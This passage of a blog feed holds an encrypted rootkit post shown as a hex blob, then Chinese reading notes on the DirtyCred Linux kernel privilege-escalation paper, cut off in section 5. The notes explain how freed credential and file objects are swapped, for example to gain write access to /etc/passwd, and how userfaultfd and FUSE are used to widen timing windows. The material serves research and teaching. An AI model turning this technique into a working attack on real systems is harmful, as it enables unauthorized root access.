1d92b32ec1b7ea9cee9e8daf1f820117a40d6d72a545894277f5ecb7d78dd071629f4b557ba1db2850b4302a5b7f0513a1f6206bcf831b67b05327421e4c6a899689f0e74b01776e16c46bedb5084beb47426faa17cf46f7ef45cfd88e47f96cea343ca701780b70d2b98a038f231ef43f57bfe62b1fb8d8ee02e5453c88a1509a51f7268d531b809ece057b68984fee05ffc0858dc894604684ce9e8b2fb968f6a6be0de1e584898db89e896685368bc0b088f1851a65a178463697b4f05da1a8e01f1bc9dd03604d047861b9cf84fe581e2054db33eeecf9b1c6be3e27f95572a0d6af4397a13da22919bbf5caa584cfc8156dc34ab5d62bf2a8dac201bef2320651bbf086297b33bf1dca5d609ddba7dd9322d628bd66895aab507a8680f9a951213c11618d80bb8266d6be49622a4a1464bad6b29e192baf942c2b15fca44a1016a64599e88b732caac5e0b2290548239e170dd9d9007f074379d74f9bffa1a1dd1af63ad60868ed71b68323b14ca98d0d5f8284509f203d36f79673d0285b8a8890e809372d9add65bfbbe8c0c5e714563a699b928125f2cbc59a5ed1213ebd70b6915e6d7e0d8f654b6f846ec166caef3163052fd9822d58e1852b0170cf1d96c8171985b9b3cf7e4fe576869cc173f99ecf8127e737e9f686c255b0750642e940c521a080c1d3180b7b3ca7494f197f8e39ee5e69e629443873d2a918ab275b3846ed81e8d2f7df44efe7baca111721d60816c93cd48d29528c4fee104390b0b111c1ccaf07fd301529029d5ad9fe3171451393ceca7940c507eb0d0f616eb2444bedcc37b1026a25dc959d32353dba4ce1d5a5869bcc195a7d925a5cdf06a9aba566479bea2a43eb9735a62b6a8b2263c5a0aac608496bd048682978b8e8d79c5833bcfb0629b77fd5eadfe90ce4fc71f5c1f9e8c4b0d4d1582cee0ad2c571bd98675df3d0fdec4bbf4b7a6b5fa3ef5b2b68018771d8db4828eda1c77440a16789f90fa55dfeef7d7e068e2930ed1dc8cffa36b53c61794906c1aed08f565a5b05b0a11ed028c3dc633a938839fe4f957bbbab6898620b8fc79305d7be11af1a0b7dcdb7d8106fc1a4e239fb1e966f49219b5fdd3a827559218309265fbc18bd83bd42bd989e04a45444452ecd3a0478db25378fb7c2e43454a375a5f6fea076f7b5338ff1774cd411540f7a1792677ec9ea948398efb16d084760e421bb7bb293e44a16f0063bbcd62f92539cf4adb46ea35c34c08fc2d3aa298253d0b3b9da71c955f1e6fe2895dd2214ca4da12881209c1e3ab5e5f6dd02d2094d8811ec4649e9b7628826a3a547303224fa4ca6e259972a5771923b684e1a74cc2459a5b7de16b08f9dd564dc2bc03b4222be3de20bb69e9db0fe3659cf4b94d4ddf747ba85100359cbd179af01e45fd8381de4636242a667f7708d80768eaf91f123676479ad0bfa0e16503faf03dd3a715b16520ff0650597fb162a5b584c4e65e4ba6d37494c0d45a57dc5bcb635264dc8dab715c18017c3b7157f78ad7834d89c862b661e085b17bc9951d32565054e0716e9ad2d152e3e241bd80d373127c842cdd68e0d949a59ea811920e48f352268159660ec323c635051c43787d0ec44947945f351d0e3b4a4bef27b52c49076215af4780fe8dd94a94645398aebba31ce76de3124c92da6cd9903be3d5f1a94604302db8e5b98fe30346bc6bfbec1b5a09f8bc44803c704b5e17cddff256a2130b1f1dcff7f587eb8f05bc99b6c956eb02e12c68c162da1a81609818d437cd86add70e4e37b71f231db759a77dfe692dd6b8424a93f1deab5eba69e9403c80aef7db7e39742728f7c0d4e5b9039b397523a813c0966650190779ea64c0b39b3a5232baf3fe7e0dfc6723e1ad4de3196d29d205531486c745322ea6e187f42613e6a13f1671a734c612133d959451d8fa3e11baf871438a61186d940bb32e7f50115bfae3c0271be6665f514895db8bf32e25eca283c57297b3f6c6d2b38884bf4270fd066231bd8e6cb2c3a96abdead49ea200a51bf92668f638321b4b3d1a79f1aa0caf2fb50e81366c2155cb87704d392fc0e194827a76e99df38ac90b18fbbb73971c42e51e612aeb4af5c29a2654e77348529f7ada0bc91d34a7d139b6e4f74d31d4e950a988ee263018b8c40d7994bfe11bf3145b1f19e342035e6459d2ac0071aee4f8d884093808ac0abc0c25c06aead27deba64981f93ed63660f1f86469e7140baba0d4aef2ffac854099ea0aadb57936c8fdd79e89a022dfc6936ff1c4d7144b2a7f186882763af264802362c97471b3240888b6f2e57dc28aa3cbe11556ad35b9ee66b2ba9e6f068b259877facc859f2a3c6e178d964745868dd9e0b29c0407bbd66c9f4191621071b88c85e7b3fc1975cc311faf611c0f0fdb1311759e6b2363967905dd9a24a2621b55e539fb77b746b7eb948f9df68ca7562890ca3a6e203ababa0f15add931a46a1b9966d886cf883335a3822fd27edc4cc770875c3ea3948635584cdaceddbe7c0ab1903535227d847483211f7c54bfe743f3c84f31c44ca7db3f8a8223beb1d3650698e2a16cb4cd3702751313159fceeaf1ad626b55aed3f4f56a5a23858cd7f42180c5ee9da28aba280f054531339ec158e1a249bb921b5b21c3ee49f95b2c959c319d237d5ce6963c0e824d9aed5e87ef3f919eaf9f6471f739d3a6eb8205f12a2aa02c10ba65c8fd5c2a845839f223937d33f92fe23346c79f91f12e123ff470f41fbd0979afa563c26106b5abbff29d9cacba34129c30651bfc52d693654ea5b9a737343d817e753001f38848877f6621f589b481a0980461131cd0fe13d963bcbaa2691bda6e0702e6ea29c9fed8d99885236e7dea64a0702926e9b65c3d56e8702df312cc79f4c9ab7d6ea55ba321fe6b3a9f7408645f3062d3025c2eb295717a16576192e3881a84a3df6e51ca55da3d47112259517f67f221e9998a0698851e2bdb9b7ed633708dbab38ed7fe854ced522b06dedadcc8bea2aeb47af2a881688f0ff24ac1cee9ad29e161a49152930d1220b7e632d835eda132482f00d68a2367c173aad1c1275c2663b78e25e872dc9c71669a26b5a1392601d1c592452d3623a6e4bea31d793ed57359a20751f81ed6474de4d94bc6887c8915422df3bd1ab150acf46d6d0683155bea9db9013effb008797a39f84616b45931f856545654926418fdf7439f2e9dfcf64194d90ca433d609b7689a745107a58509d61169bf9785a6571b7e6e2d8d9e2b2680763fd215358d20ff32da0b07f335b34dd69b6cc74d09e0d62961050861c5d7318d9a2b3e777aab05fe33565a88a90abbfdc620cbc2258f939081a83576d4de37a0cdadb2e23061d56dd579492b637c971191f69acdfc8763ed1bb0d78fd0e4a9b2e6890aa9895d8d6a5a785ea1fdecfccceaca2b12e4886ccbe42993643b9e4960c8c985e96bbef2a49c8399f3230631c3f99d1164e9c6d1ebaa441023cd4ab74cefb70576194f2f1430178a5ee9d1aee57d5e27ec321a47c04c4f6eb6d1c042aa33208e19e80102318b80355ae34db1e6474b938ff81fcc6087ffc474ae7867793c1c14df42590c790b3ee79f58fe194cd88d9631f5f074ca03d2ea9bc9a356e5e309cdf6bbedaca9305c03f2800594318f9d71f6d79090d3ca13a5cf8efe6686989b4e33d9132ce33ff4d5afff0fd3e043eaf8729a1647747d092c6cc592b763320881249446473553f357b3390402f9a18242a90de471f2dd637736a4b107cad50c6729ed4a433f67b42b5933e82b13abe75535aa2d11b0d4e8aabb591382e8bfbc7b41453e27b712490ff8e424e8dd4a6a44f4d13f19572ab9137f7255c23dcb3bda2a2d032ed0d0735a649c255015f42f6cebee721150ee3cc11d3b2924bd4c06e23e56d6a7a090e241425b70fe69663b8a9b31299c1407613c471919167c0454168b69da070b8d33ff599e058be8a4f4a15be685b1d29a51069f529b47df50facac7075eac127e78ebd000bd7ed77e98937c5c066853713586dcee95c72bbbaa309358ffe2631c0aa2e507dc89b1d44d41ff7d36d60c24da6ca951d555c61117e01851e7a9e19bb06fc0f53064e90fcf5eaf9d46ed818081b4d5a003f12c49512013c8955f813d783e64f4ce0cd3f39a29dccdec5a21870b37d540ba30e7f1f2cea4fb7d1a614473a22087a777a2a3753b8ae11fdf574d67e2042aeb54f617e05b431bd3750da9a3b126e0b6e61900cfce2639f0ef08f64083d75102603544ce3bf24c3fbf12fa4f4aa6d7fdef45776c399626d067b93cee2118c87607f22b9a95f4ad41d682c4c77041bee455abfc123548d55eb4277a6c82ce61ce6cf9e33a19da598c506bf63fb67c415c704bd0fb9cb8bf66b6cbeb530a5e219534a4cc583f526c14b06cc2416e50cb94fab0723cae3b25e13eb8c773edce2e91d99fa491ec7c27834a83b06353caf56956c407bedfcfb16d85051a8cd2aa37123771b1d3ec3adbf39b370aef4aebdd1e7df4dee49278c7942f75b84c59f560c7a7cabe980f26f4c29b99606f41378689d7a6f8693e6cd8f693f9ee41249f25cd0d0c88c91ec2f4b0092de5d0080a14022ff6fd78727761063219413c74b4138bbc814797c4ce9ad33a4c74eda62f4a1549d34c392044d91a2608e9a509af2228b8580de815ca51a7eca7b4d591bbd58b321a8042922560bdc5829f639453a87030f466d04747dede4fc18ec0791b0d6bf7de6e7a7c6cbf55faa4f3d747e698c7eaede202f232ebaa9bae38b8479d01a56bc355a5e7adacc6d0db4076a459f3cb02f1f1a318576dfd3dd672ef288778f5704037a5ed309eabcf7f0e3267f966757d88d136505a30254cef7e444198fb84a358d337c4e1dc7e9fb7b3d8f887066fb2cc92358dab1bbef895825f39c2e7bb891bac1641784fa23d74aecd5b3a5ded64a06041f546d4cd41519995c7fedc717736aa11241b60541ce3ce6758a3e8be71c0ea569fe21f4d4fc91f95f01239c200418de6f1888b6831d5cbac7e8302b6fffed916013b14b4f952399d270b58008214b188c2d5866f1fa8446879d9678221809e5c9736c8f1d263bbfafd6761c6a0965b401738e3d74e615bb1587dec77fafcad09379107690e24322acb284d7c0edd8b70b7385184f71082d0a9c3e88b60ac0d65e847544b453e1a195c67cea045dc90c2374a5504a3193dfc89147a5621e9b09bbf35beec42c89ba145aca50bd4c85e64b9d0c769775c19f5f5a14c6ceb4a79d970e53d921eb60f18edbc0d8ebcf6c58c87b44312df2c65afa8b981d49bca10f1211710e65a33af7f98897b1e6146e67033d4693b07704a9f7483dc452fe8039148fb3a2e6b501790af7d5f4e558c5ee1dec5aa7b5188ea9bb36e9b671ea718742a29737eb088cc252f05a368be75bd45af60293494ceea9295e43fe4130333305c0ded8087a1acf2b1535061ef97e5139cf5156a1bf0e0e15afad69709ec0fcc93c3a0bddc88af7911fbcdfa0f3df89fbbd3a3be1ad2908beca176815d91d28dfb3ab4093fffbee96085c2f52f660c97fd096161fed6f8b8e479b28867a6ad7a189e2a9dad603f0b18e6145aa627155cbe0a11d50e241ea60402a450bfd49f4d5cd52b5c43e26e35231efb5e4fbe071c93e72eae436e5c4dacfb1b25757d19588ad3e9c262aaa511532b82373b711bfb6a75a121d47a174e90f9110a1e25fb224bdaf0b14eb7f865cfd418bf08a5ae72fdec9116485bd02c8419f512b51cf52e2e57dd6d0279c80958a371b36e6938d0d79065a59dcb9d2a9309d63a27f75432d105a3a7c1a30c000192ce69303b49e4e1732c46a47ff482d1d3c27c5f05215c6bc4159437a68c5964b4972516ed8d563b07d60901c60a6d1d73f1fae0404a892824e67c4950bb562842b19816c336c2a82af15e8c3cfaad1bbb2303ccd6fde460f2b5f63930fc5574c19d929c492b711588ebb3e655ec9410f9e02c341973fbbfa8f578a18b2614206e7e179f4108481b69c6998ce9abb03b37db784bba602d66adfa0d8bf7477acb11a890acf54c52e2708a6314a3cb9de3f30ca602df85b15129efc510bbc7e9fdb6560b4488a8a9221cd363b0cf64a5f53f5a54018eff27b4f297b751789d69725497df5a54b09db271ce157c289819b5df04cc30cfa3acb14336948b7f279acd57f8a7c028e97ee30ee27923ee2a05bac9ef6960f25b92d0c9e1c1bfc18bceeb479e354a48a8fce15ef08fea7e6841680e01f09234dc87f952ce0ec9a7df03e6d01cbc25722c1c1bdca5839964e2b8957a693d86da1cc5fb03aea40ed0bdca8cecca7e90d3765cc232eeb83d8038e3a2ffeeb01bc43444558e9ca3decf8662dc3f4e3fc7c214cbe1f5855a1286d77a9fd280c280035e9c5de50b8f18fdebc475c6aee5b476aba9f9c27210fb39faf5765e49d922a61f8ae47625a25b355bb9a14482712b20214b4690351b8bd0dd7af2442d813a11eb8a1ba0df006aaee4cb1e6bf432067c2d2ac4bf469c56e4a03a432db0285e8ec2f77424202c38f54e5747280c39aed6d0dd8d8e3c053d6f8dc9abd13a78cfc7bbda0b50821feac069d84d4259ff4c905a05eed0aa1a688ac883313f75573c9d0e1bc35c78dd71163f855d2437d7303372ba185cc60eda7112bd55e89673122359e386c6a62f265bd5babd5ab4bb97bcd9a9bf8c99b92639fd691e56f139c07257ae332563fdf061039d790e4c97309380804168655d2e3f2aa56cd78409cb2285f694613bffe54c75a67b5579d3974217dd855a2349b408f5ccb2ecdf14bc0444163cd0d4e5719f9570a1fdf276316a81cae3c72d4c73e2218d27581436a4573cfb507b79b84a94116bd0ff991a2ad421910630c65123f066abd832f1869477609dc8ae9e175c6345201e04ab3d41eb0074484aaeb03ea73384f84518a6c9fa282b5049e6dd2f99f12792cc1d19655ec31257a8b32cde84c0398f4a3765ecb7bfdb40d8e6ac11582fc2b7395af182067c926fcda9e88243426566ddcd70126e8880e592fad5049bfd57f804addecde2d587eca7f71f0dfab5b0ffcc6ea11599a18568f6f15f56c62a92ea84063db48525df32ab4efddd71d22ba7de492e2a5d0f5f090d19d41b126a54677b43531213d8a9caede3f674fddaecb46aee02b231c7a53d9ab5078d40b54e7b6567f4ab3faba237c93a712b6c457c7956ce47a8242cfc3365784b3d685bab2b2c5073b9ff1b30e668975d047c243021e77760d79d7c3a2b6c8e2955742eea0e3235aa5d7f3828dbe1077bac0a61e0e503539614fc6207d8a07dde4abca1aeb15f27ace2acb719e15293e2abe6b45b885e52c4e7bef0be98521f59eb48bf82456c5fe2bb491b7dd7808d94fc4639d79eb97328d9f29e2c58822cd6687fb06829d91155a8dde7ec0946b7e897f2a14eab91d4364aade3db445158a441d924b9bd2f777712eb109e83b507b5d810a3a15d4d450445fdc6b909f4d4584cbfeaf975d8937424381e1bf915b8d5cfc977b719cd14f5b0b6bfcdf663228b61f35b5506a677a31958624ed2d04cb57fbfd31e862349ace31320611bd4266e59cd1d28e9692c51d04cf3192080dc1ca068f376d42c3bd7ffce9255789686ca7054f372d8d9cbc7406b3859f1df4a14849058ba708528a42cc2835b4449a827dd2eeafe112a123e99b8b350a70dbe530ee63534561f91ca4beb98e5c9294c8e2dd8037acfdc8dd0eca1b2ea8c763fbdbe0a824d54cdfc563983c818ee192580a3741440421749c8122bbc91167bb2543fc56bfe55335f8458f40887f8712614634982f667b7045311e3befb1c9bb5c50475e3dd8a264cd550cdeed21ea2f699d0626d19f6a36f13a8f105c6cffa024c91b0abf5433d6f3c1dc355e1b9ecd220152d0daf9e267d0517030030875964f086de5dbaec453ac9cc41c2b4ebe97f74eaf4ebd401ba092955d4c3ca0c398c692358613a1d29ea01f673c7e3b900a1da5b7908fc2084613c04189c393367bdabd31d7e9565b0ec165185a7e66492bdd96655ca66236f470fbc5f0e30f101c0e6735ea84bbf3efc3231a15dbdb233f11f78e6786399c0b65587774ea6d0f042b981351ca824224505a4b9646c61a723e400faa4b22f0a706c9f5cbb9e89e716acb7fad68b2b6af34b9c76ce2bc58e71aa6ddca1c10d790e03b7735fc4f1ce28e02c87c57619b66437ae16ed8c08b459a533cf5470bd6deae8112b2cb5065d70d2b546f4e17d80ef33ab10961df2369fdf17e229808d9fdd86789d2e7341a8621ca6f4695c793a6e41375c968864ab43a7a592cf4c8e6dd501b0e40e19b8a42f35cdb1668a1df40604208819c2d7ca6057bde542ab47b82150a1428dfb0f1e9875175c0717fcb447bf69b9c0ea38017ef10e74db9cca58c30f919e95dac8d8b261fe8ca8f22b3b3167ddb70576cbeaa65ee452bb3518eca039cf319f3fc551fdea81a0985672037de88865e725d62b0729b56590c9eeae2a7ab8fd7a8567bc2402f32f80473631f2bb4c5293cdd0255d601989533149e35bd5d8bec89d39ebd6c2b940f5b7062c5313dcea81870b4c366b38f09748da4d370463e499f9d43b70fe9bdbdfd8b86263a406d538a10bb46db66a4a7210ef53c1ecc1c87cca37207a4bdcc0474c6fcec13f6a9e4fb9d08942b4e1ea895111c48eba163c026fc6dd89329d391ca1c3aa52a363f4259240172122d8fb21ce24fbf2c8871bd16aa9e7e616fda4b874ed69fde8e5c07b204ce8fade1b5947b97ce3095a4bb06b194acb11d4d64e8d62faf41d8719acbe815ab95de8fad19357669b3bfb95a61577b4ce0ee40c72839f58a3f4d6f2e34db3ea147e4de061dc3a12bde39b1b141e2d9ae559531fdc551365ad3495946728176dc53a4cdde3b94e5172fa87f38cdcf35796cefea5250e9055fc47fc8d6132ff85f379b054bb6bfa1119433588adf4d9933808f0aa71c73bb853d555f5658deaedbe6365ad4751cd4be818d28c796051c150b3a44f3eb9737581ac7c38c30378e7b1a3aae7032ac3b018dfe5a1cc84c15906798db6a379b4256f4e2d1d0d643e9df343c7e82eb19c0d7c7a1ed98832d5b612d741f56344b3dfc80e35d6ff9d37be032732156605aae0372eda939b1d0a4f92caa0b1f269b0e26c053e0a40a2144ad04d9615075af38b2fb47fb8225b6b9dda19f20689970bf42215c8a406532bb11f5438ad1532555c269d5f78f481e2474c217aa18ebf7912a4e69776b6c8468894753ed7ac0412bed1863e28cd96a1b5cfc3f4192f12d740cbd9aa572f58e2651bb5347a6224eb5444a03d10df380d2b5a26d4d6ee7dc1a5c73655b8561f12d77519c709c29531821641e3b4c89274b3aa18045f85a5b6099e43ce42a15a314f666bd50a41108af589be9fc0a92aff64a21f3ce0001981365ec279a50cc46838996de97d7d4c3f7b3f1f94896d04b9e662578968bdeb06a51f0127f47cb40777180217e712a67aa607480a35cf04cd1b30f8e62f4b2027bf3deab995fd57cd02e09f4742cf0fac46e7570abe1ede9ae676e91e960139d5cf282d3bf776702d1ffc21d77b73881b28ade224be30bc0a1c29022f2d68fac050a6d150250d18193c3cae9570f07caf64be381ecc53174e36f8ecad1a820fe80d118b51ae2f74fd14721e2a718113f19fb0cfbca7c42e131526e89396b6dba4d1258af273f7522246edd2d5d8337f87af8587712fe43d22924a543f49797b79f8dcb3c1f2b2a6c1a3f763b1bf327e8329f265f517a4a291c0c6c86e315ecc5cd790398195800dbdd6eeb2bd90931a8dfd8bb49c6040e77771645a13ce57e8a084ae44e303ade87dd0834cb9bc279c2edb0bbadaed811380cb8cc20ea336d7611aad59423d093c877051541593d852f8ec8d8454821ca11d3e5682243</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">没写完，别急，急的话可以先看先知上的半成品</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">本文首发于先知社区：https://xz.aliyun.com/t/12439</summary>
    
    
    
    <category term="VIRUS" scheme="https://arttnba3.github.io/categories/VIRUS/"/>
    
    
    <category term="ROOTKIT" scheme="https://arttnba3.github.io/tags/ROOTKIT/"/>
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="https://arttnba3.github.io/tags/Linux-Kernel/"/>
    
  </entry>
  
  <entry>
    <title>【PAPER.0x05】论文笔记：DirtyCred: Escalating Privilege in Linux Kernel</title>
    <link href="https://arttnba3.github.io/2023/12/31/PAPER-0X05-DIRTY_CRED/"/>
    <id>https://arttnba3.github.io/2023/12/31/PAPER-0X05-DIRTY_CRED/</id>
    <published>2023-12-30T19:34:16.000Z</published>
    <updated>2023-12-30T09:00:40.000Z</updated>
    
    <content type="html"><![CDATA[<p>新瓶装旧酒的 114514 种写法</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><p>DirtyCred 在 <a href="https://i.blackhat.com/USA-22/Thursday/US-22-Lin-Cautious-A-New-Exploitation-Method.pdf">blackhat usa 2022上的演讲 ppt</a> 和<a href="https://zplin.me/papers/DirtyCred.pdf">发在 CCS 上的论文</a>笔者很早就看过了，简而言之这个利用手法的思路其实算是比较容易理解的，所以理论上来说并没有必要专门写一篇博客，但是最近刚好需要做关于 DirtyCred 的技术分享，以及 12 🈷笔者暂且一篇技术型博客都还没有写，为了不破坏<a href="https://arttnba3.cn/2000/10/12/hello-world/#About-the-blog">曾经给自己定下来的规矩</a>，笔者决定简单水一篇关于 DirtyCred 的博客：）</p><h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p><a href="https://arttnba3.cn/2022/03/12/CVE-0X06-CVE-2022-0847/">DirtyPipe</a> 在安全社区引起了一阵狂欢，但这个手法限制太多了，因此作者给出新的类似的利用方法——<code>DirtyCred</code> ，通过篡改<strong>凭证</strong>（credential）结构体来进行利用，同时作者还给出了防范手段</p><p><strong>KEYWORDS</strong>：OS Security; Kernel Exploitation; Privilege Escalation</p><h1 id="0x01-Introduction"><a href="#0x01-Introduction" class="headerlink" title="0x01. Introduction"></a>0x01. Introduction</h1><p>Linux 对于黑客们而言非常流行，但 KASLR、CFI 等防护手段让利用变得困难，因此 <a href="https://arttnba3.cn/2022/03/12/CVE-0X06-CVE-2022-0847/">CVE-2022-0847</a> （DirtyPipe）的出现引发了热潮——她不需要与众多内核防护措施，但仍存在不够普适的缺陷</p><blockquote><p>笔者注：这里作者为了抬高自己的手法在前面贬低了一嘴 DirtyPipe 做铺垫，但其实将漏洞转换为 DirtyPipe 已经是非常常见的利用方式了，就笔者所知 DirtyPipe 比 DirtyCred 实际上<strong>适用性是更加广泛的，现在在 CTF 与真实世界漏洞利用中大家都倾向于将漏洞转为 DirtyPipe、而并非 DirtyCred 进行利用</strong>， <del>但是为了发论文嘛肯定得自吹自擂一手</del></p></blockquote><p>本文提出一种通用利用手法——<code>DirtyCred</code> ，其并不基于管道机制或是 CVE-2022-0847，而是通过堆漏洞将低权限的 credentials 结构体替换为高权限的 credentials，简而言之本文贡献如下：</p><ul><li>提出了新的利用手法 DirtyCred，其可以规避许多内核保护机制</li><li>证明了 DirtyCred 可以在真实世界漏洞中广泛进行利用</li><li>分析现有内核保护机制并设计出了一种新的保护机制</li></ul><h1 id="0x02-Background-Threat-Model"><a href="#0x02-Background-Threat-Model" class="headerlink" title="0x02. Background &amp; Threat Model"></a>0x02. Background &amp; Threat Model</h1><h2 id="2-1-Credentials-in-Linux-kernel"><a href="#2-1-Credentials-in-Linux-kernel" class="headerlink" title="2.1 Credentials in Linux kernel"></a>2.1 Credentials in Linux kernel</h2><p><strong>凭证</strong>（credentials）指内核中包含权限信息的东西，在 Linux 内核中被实现为带有权限信息的内核对象（包括 <code>cred</code>、<code>file</code>、<code>inode</code>，本文仅用前两个因为第三个仅会在创建文件时被分配）：</p><ul><li>Linux 内核中每个进程都有一个指向 <code>cred</code> 对象的指针，其中有着该进程的权限信息，如当进程要访问文件时便会检查 cred 的 UID；cred 对象还描述了能力（capability），如 <code>CAP_NET_BIND_SERVICE</code> 说明了进程可以将一个套接字绑定到一个端口上</li><li>Linux 内核中每个文件都有着对应的权限设置，且与 inode 对象绑定，在进程要打开文件前内核会调用 <code>inode_permission</code> 检查权限，在文件打开后 <code>file</code> 对象用以记录权限设置</li></ul><h2 id="2-2-Kernel-Heap-Memory-Management"><a href="#2-2-Kernel-Heap-Memory-Management" class="headerlink" title="2.2 Kernel Heap Memory Management"></a>2.2 Kernel Heap Memory Management</h2><blockquote><p>建议看 <a href="https://arttnba3.cn/2023/02/24/OS-0X04-LINUX-KERNEL-MEMORY-6.2-PART-III/">【OS.0x04】Linux 内核内存管理浅析 III - Slub Allocator</a></p></blockquote><p>内核堆对象有两种缓存池：</p><ul><li><strong>通用缓存</strong>（Generic Caches）：相同大小的都能从这类池中进行分配</li><li><strong>专用缓存</strong>（Dedicated Caches）：出于安全与性能目的考虑设计的仅供某些结构体分配的池</li></ul><h2 id="2-3-Threat-Model"><a href="#2-3-Threat-Model" class="headerlink" title="2.3 Threat Model"></a>2.3 Threat Model</h2><p>作者假设非特权本地用户可以访问 Linux 系统，目的是利用堆内存损坏漏洞进行提权，并假设上游（5.15）所有缓解措施与保护机制都已启用（包括KASLR、SMAP、SMEP、CFI、KPTI 等）</p><h1 id="0x03-Technical-Overview-Challenges"><a href="#0x03-Technical-Overview-Challenges" class="headerlink" title="0x03. Technical Overview &amp; Challenges"></a>0x03. Technical Overview &amp; Challenges</h1><h2 id="3-1-Overview"><a href="#3-1-Overview" class="headerlink" title="3.1 Overview"></a>3.1 Overview</h2><p>作者使用 CVE-2021-4154 作为例子说明 DirtyCred，这是一个 <code>fs_context</code> 对象错误引用 <code>file</code> 对象所导致的类型混淆错误，这允许将正在使用中的 <code>file</code> 进行释放</p><p>如图 1 所示：</p><ul><li>首先打开可写文件 <code>/tmp/x</code> 分配一个 <code>file</code> ，之后尝试进行数据写入，权限检查通过，之后 DirtyCred 将文件写入暂停</li><li>接下来触发漏洞将 <code>file</code> 结构体释放</li><li>之后打开只读文件 <code>/etc/passwd</code> 重新取回该 <code>file</code> 对象，并恢复数据写入，此时便成功完成越权写</li></ul><p>该例子只是用来说明 DirtyCred 如何利用 file 结构体进行利用，如 Section 2 所言，除了 <code>file</code> 以外，<code>cred</code> 也可以作为利用对象</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231230070520.png"></p><p>从真实世界案例中可以看出 DirtyCred 不会劫持控制流，本质上是操纵内存中的内核对象，因此许多现有的控制流防护手段无法进行防御，一些工作（如 <a href="https://grsecurity.net/how_autoslab_changes_the_memory_unsafety_game/">AUTOSLAB</a>）则在对抗 DirtyCred，但如第 8 节所言其仍无法防御这种手段</p><h2 id="3-2-Technical-Challenges"><a href="#3-2-Technical-Challenges" class="headerlink" title="3.2 Technical Challenges"></a>3.2 Technical Challenges</h2><p>DirtyCred 仍面临一些挑战：</p><ul><li>DirtyCred 需要 invalid-free capability 去释放掉一个低权限对象并重新分配为高权限对象，这种能力通常难以获得，因此 DirtyCred 需要将漏洞的不同能力转为所需能力，我们将在第 4 节进行描述</li><li>DirtyCred 需要暂停文件写入操作，这同样是一个挑战，我们将在第 5 节中介绍可以达成该目标的多种机制</li><li>DirtyCred 的关键步骤是要用高权限凭证替换掉低权限的，但对于低权限用户而言分配高权限凭证也是一个挑战，我们将在第 6 节中给出解决方案</li></ul><h1 id="0x04-Pivoting-Vulnerability-Capability"><a href="#0x04-Pivoting-Vulnerability-Capability" class="headerlink" title="0x04. Pivoting Vulnerability Capability"></a>0x04. Pivoting Vulnerability Capability</h1><blockquote><p>Pwn 人基本功了嗷，憋和👴说你不会嗷</p></blockquote><p>虽然 CVE-2021-4154 展示了 DirtyCred 的威力，但实战中我们并不一定有这样的能力，因此我们需要进行能力转换（笔者注：漏洞迁移的概念）</p><h2 id="4-1-Pivoting-OOB-UAF-Write"><a href="#4-1-Pivoting-OOB-UAF-Write" class="headerlink" title="4.1 Pivoting OOB &amp; UAF Write"></a>4.1 Pivoting OOB &amp; UAF Write</h2><p>如图 2 所示，我们可以通过 partial overwrite 将包含指向凭证对象的指针的内核对象进行复写，使得两个指针指向同一个凭证对象，从而进行 DirtyCred，由于堆喷连续分配的结构体通常分组来自相同 slab，因此可行性很高</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231230072228.png"></p><h2 id="4-2-Pivoting-DF"><a href="#4-2-Pivoting-DF" class="headerlink" title="4.2 Pivoting DF"></a>4.2 Pivoting DF</h2><p>通用缓存（如 <code>kmalloc-96</code>）与专用缓存（如 <code>cred_jar</code>）间存在隔离，但我们可以通过释放缓存页面并重新分配的方式使得跨缓存的内存操作成为可能，如图 3 所示，我们先分配大量对象，通过漏洞我们有两个指针指向同一对象，在大量分配后我们将其大量释放，并保留一个垂悬指针，之后再分配为凭证结构体对象，以此进行 DirtyCred</p><blockquote><p>笔者注：这个手法也出现在笔者近期供给某些 CTF 比赛中的 kernel pwn 题中，可惜怎么都是 0 解（恼）</p></blockquote><p>但如图 3(f) 所示，漏洞对象大小不一定匹配凭证对象大小，从而无法 DirtyCred，这种情况下我们需要保有两个指针，将其中一个释放掉从而构造出空内存槽以分配为凭证结构体，再进行释放以获取所需能力</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231230072544.png"></p><h1 id="0x05-Extending-Time-Window"><a href="#0x05-Extending-Time-Window" class="headerlink" title="0x05. Extending Time Window"></a>0x05. Extending Time Window</h1><p>DirtyCred 需要我们延长权限检查到写入之间的时间窗口</p><h2 id="5-1-Exploitation-of-Userfaultfd-FUSE"><a href="#5-1-Exploitation-of-Userfaultfd-FUSE" class="headerlink" title="5.1 Exploitation of Userfaultfd &amp; FUSE"></a>5.1 Exploitation of Userfaultfd &amp; FUSE</h2><blockquote><p>简而言之长话短说可以参见<a href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#userfaultfd%EF%BC%88may-obsolete%EF%BC%89">这里</a></p></blockquote><p>userfaultfd 允许我们在用户态手动处理缺页异常，FUSE 允许我们实现用户空间文件系统，这为延长时间窗口提供了可行性，如读写注册了 userfaultfd 的内存页或是读写 FUSE 文件来触发我们的自定义 handler 函数</p><p>下面我们以 userfaultfd 为例（FUSE 利用方式类似），DirtyCred 通过系统调用 <code>writev()</code> 进行文件写入，不同于 <code>write()</code> 系统调用，其使用 <code>iovec</code> 向量来传递数据，如 List 1 所示，4.13 版本前的系统调用 <code>writev()</code> 首先进行权限检查，之后再通过 <code>iovec</code> 向量导入用户空间数据，最后才是写入，因此 DirtyCred 可以很轻易地使用 userfaultfd 的特性来获得合适的时间窗口</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231230164326.png"></p><p>这项技术初见于 <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=808">CVE-2016-4557</a>，但现在已不再可用</p><h2 